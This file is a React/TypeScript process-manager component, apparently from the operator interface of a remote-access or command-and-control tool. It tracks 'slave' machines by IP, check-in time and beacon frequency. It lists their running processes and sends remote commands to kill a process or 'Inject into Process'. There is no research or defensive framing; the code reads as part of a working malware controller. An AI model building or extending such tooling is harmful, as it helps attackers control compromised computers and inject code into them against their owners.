import { useEffect, useState } from "react";
import { sendCommand } from "../utils/commandUtils";

interface Process {
  pid: number;
  name: string;
}

interface SlaveData {
  freq: number;
  slaveIP: string;
  slaveLastCheckin: string;
  slaveName: string;
  slavePing: string;
  slaveStatus: string;
}

export default function ProcessManager({ slave }: { slave: SlaveData }) {
  const [processes, setProcesses] = useState<Process[]>([]);
  const [contextMenu, setContextMenu] = useState<{ x: number; y: number; process: Process | null } | null>(null);
  const [output, setOutput] = useState<string>("");
  const [isFetching, setIsFetching] = useState<boolean>(false);

  //  Fetch running processes from API
  const fetchProcesses = () => {
    setIsFetching(true);
    sendCommand(slave.slaveName, `get_running_processes`, (response) => {
      try {
        const lines = response.trim().split("\n"); // Split response by line
        const parsedProcesses = lines.map((line) => {
          const [name, pid] = line.split(","); // Split by comma
          return { name: name.trim(), pid: parseInt(pid.trim(), 10) };
        });

        setProcesses(parsedProcesses.filter((p) => !isNaN(p.pid))); // Remove invalid entries
      } catch (error) {
        console.error("Error parsing process list:", error);
      }
      setIsFetching(false);
    });
  };

  useEffect(() => {
    fetchProcesses(); // Fetch process list on mount
  }, []);


  //  Handle right-click on a process
  const handleRightClick = (event: React.MouseEvent, process: Process) => {
    event.preventDefault();
    setContextMenu(contextMenu && contextMenu.process?.pid === process.pid ? null : { x: event.clientX, y: event.clientY, process });
  };

  //  Handle action selection from the menu
  const handleMenuAction = (action: string) => {
    if (contextMenu?.process) {
      sendCommand(slave.slaveName, `${action},${contextMenu.process.pid}`, setOutput);
    }
    setContextMenu(null);
  };

  return (
    <div className="w-full rounded-lg text-white relative">
      <h1 className="text-2xl font-bold mb-4">Process Manager</h1>

      {/* Show Loading Message */}
      {isFetching && <p className="text-yellow-400">Fetching processes...</p>}

      {/* Process List */}
      <ul className="border border-neutral-600 rounded-lg divide-y divide-neutral-700 max-h-80 overflow-y-auto">
        {processes.length === 0 && !isFetching ? (
          <p className="text-red-400 p-2">No processes found</p>
        ) : (
          processes.map((process) => (
            <li
              key={process.pid}
              onContextMenu={(event) => handleRightClick(event, process)}
              className="p-2 hover:bg-neutral-700 cursor-pointer flex justify-between" onClick={(event) => handleRightClick(event, process)}
            >
              <span>{process.name}</span>
              <span className="text-neutral-400">{process.pid}</span>
            </li>
          ))
        )}
      </ul>

      {/* Context Menu */}
      {contextMenu && (
  <div
    className="fixed bg-neutral-900 border border-neutral-700 rounded-lg shadow-lg p-2"
    style={{
      top: Math.min(contextMenu.y, window.innerHeight - 100) + "px",
      left: Math.min(contextMenu.x, window.innerWidth - 150) + "px",
    }}
  >
    <button
      className="block w-full text-left px-4 py-2 hover:bg-neutral-700"
      onClick={() => handleMenuAction("kill_process")}
    >
      Kill Process
    </button>
    <button
      className="block w-full text-left px-4 py-2 hover:bg-neutral-700"
      onClick={() => handleMenuAction("view_details")}
    >
      View Details
    </button>
    <button
      className="block w-full text-left px-4 py-2 hover:bg-neutral-700"
      onClick={() => handleMenuAction("inject_process")}
    >
      Inject into Process
    </button>
  </div>
)}


      {/* Show API Response */}
      {output && <p className="mt-4 p-2 bg-gray-800 rounded text-lime-400">{output}</p>}
    </div>
  );
}
